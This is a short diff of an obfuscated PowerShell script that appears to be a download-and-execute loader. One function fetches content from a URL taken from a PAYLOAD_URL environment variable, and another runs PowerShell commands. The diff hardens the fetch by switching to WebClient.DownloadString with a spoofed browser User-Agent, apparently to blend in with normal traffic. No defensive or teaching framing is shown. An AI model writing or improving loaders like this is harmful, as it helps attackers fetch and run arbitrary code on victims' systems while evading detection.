@@ -4,8 +4,9 @@ function XhYjVwJtKz {
     )
 
     try {
-        $FfGgHhIiJj = Invoke-WebRequest -Uri $AaBbCcDdEe -UseBasicParsing -TimeoutSec 10
-        return $FfGgHhIiJj.Content
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)") 
+        return $webClient.DownloadString($AaBbCcDdEe)
     }
     catch {
         Write-Host "Error: Failed to fetch data from URL - $AaBbCcDdEe"
@@ -25,7 +26,6 @@ function XoRpQkZtLs {
         Write-Host "Error: Failed to execute PowerShell command."
     }
 }
-
 
 $QwErTyUuOo = $env:PAYLOAD_URL  
 
